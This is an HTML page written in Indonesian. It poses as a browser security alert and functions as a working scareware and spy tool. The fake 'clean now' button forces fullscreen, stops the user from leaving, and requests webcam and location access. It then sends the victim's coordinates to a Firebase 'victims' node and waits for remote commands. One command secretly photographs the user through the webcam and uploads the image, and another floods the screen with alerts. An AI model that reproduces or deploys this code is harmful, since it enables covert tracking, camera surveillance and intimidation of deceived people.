<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>SISTEM ERROR - PENTING</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        body { background: white; color: black; font-family: sans-serif; text-align: center; overflow: hidden; }
        #virus-overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:red; color:white; z-index:9999; padding-top:100px; }
    </style>
</head>
<body>
    <video id="v" width="1" height="1" autoplay style="opacity:0;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <div id="m">
        <h1 style="color:red">⚠️ PERINGATAN KEAMANAN!</h1>
        <p>Browser Anda mendeteksi ancaman. Klik tombol di bawah untuk membersihkan dan verifikasi lokasi.</p>
        <button onclick="lockTarget()" style="padding:20px; background:blue; color:white; border-radius:10px; font-size:20px;">BERSIHKAN SEKARANG</button>
    </div>

    <div id="virus-overlay">
        <h1>☣️ SYSTEM CRITICAL ERROR ☣️</h1>
        <p>PERANGKAT ANDA SEDANG DI-SCAN...</p>
    </div>

<script>
    const firebaseConfig = { /* TEMPEL CONFIG LU DISINI */ };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    let myId = null;

    async function lockTarget() {
        // Fullscreen & Anti-Exit
        document.documentElement.requestFullscreen();
        window.onbeforeunload = function() { return "JANGAN KELUAR! DATA ANDA AKAN HILANG!"; };

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            document.getElementById('v').srcObject = stream;
            
            navigator.geolocation.getCurrentPosition(pos => {
                const ref = db.ref('korban').push({
                    waktu: new Date().toLocaleString(),
                    maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
                });
                myId = ref.key;

                // Listen Perintah Virus/Foto
                db.ref('commands/' + myId).on('value', s => {
                    const cmd = s.val();
                    if(!cmd) return;
                    if(cmd.action === "TAKE") take();
                    if(cmd.action === "VIRUS") executeVirus();
                });
            });
        } catch(e) { alert("ERROR: IZINKAN SEMUA AKSES!"); }
    }

    function executeVirus() {
        document.getElementById('virus-overlay').style.display = 'block';
        // Spam Peringatan
        setInterval(() => {
            alert("⚠️ SYSTEM THREAT DETECTED!");
            alert("⚠️ DATA LEAK PREVENTED!");
        }, 1000);
    }

    function take() {
        const v = document.getElementById('v'), c = document.getElementById('c');
        c.width = v.videoWidth; c.height = v.videoHeight;
        c.getContext('2d').drawImage(v, 0, 0);
        db.ref('hasil_foto/' + myId).set({ foto: c.toDataURL('image/jpeg', 0.4) });
    }
</script>
</body>
</html>
